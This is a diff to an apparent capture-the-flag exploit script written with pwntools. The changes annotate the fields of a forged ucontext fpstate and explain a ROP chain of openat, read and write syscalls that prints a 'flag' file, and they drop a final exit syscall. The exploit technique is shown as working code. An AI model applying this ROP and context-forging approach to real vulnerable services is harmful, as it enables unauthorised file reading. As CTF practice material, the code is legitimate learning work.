@@ -65,13 +65,13 @@ def build_ucontext(rsp, rip, rdi=0, rsi=0, rdx=0):
     frame.rdx = rdx
     setattr(frame, "&fpstate", rsp + 0x1A8)
     fpstate = {
-        0x00: p16(0x37F),
-        0x02: p16(0xFFFF),
-        0x04: p16(0x0),
-        0x06: p16(0xFFFF),
-        0x08: 0xFFFFFFFF,
-        0x10: 0x0,
-        0x18: 0x1F80,
+        0x00: p16(0x37F),  # cwd
+        0x02: p16(0xFFFF),  # swd
+        0x04: p16(0x0),  # ftw
+        0x06: p16(0xFFFF),  # fop
+        0x08: 0xFFFFFFFF,  # rip
+        0x10: 0x0,  # rdp
+        0x18: 0x1F80,  # mxcsr
     }
     return flat(
         {
@@ -107,11 +107,19 @@ pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
 pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
 syscall = rop.find_gadget(["syscall", "ret"])[0]
 
+# BUF_SIZE is used for both read/write buffer size and as rdx value.
+# Since there's no good gadget to control rdx separately, we set it to 0x80.
+# As openat() flags, 0x80 = O_EXCL, which has no effect when opening existing files.
+# As read/write count, 0x80, which 128 bytes is sufficient for reading the flag.
+# 0x100 = O_NOCTTY, which has no effect on regular files, is also a great choice.
 BUF_SIZE = 0x80
 ctx_addr = fork_handlers + 0x200
 
 
 def build_chain(buf_addr, path_addr):
+    # openat(AT_FDCWD, "flag", rdx) rdx = BUF_SIZE = 0x80 (O_EXCL)
+    # read(fd, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
+    # write(1, buf, rdx)            rdx = BUF_SIZE = 0x80 (128 bytes)
     return flat(
         [
             pop_rdi,
@@ -134,11 +142,6 @@ def build_chain(buf_addr, path_addr):
             buf_addr,
             pop_rax,
             constants.SYS_write,
-            syscall,
-            pop_rdi,
-            0,
-            pop_rax,
-            constants.SYS_exit,
             syscall,
         ]
     )
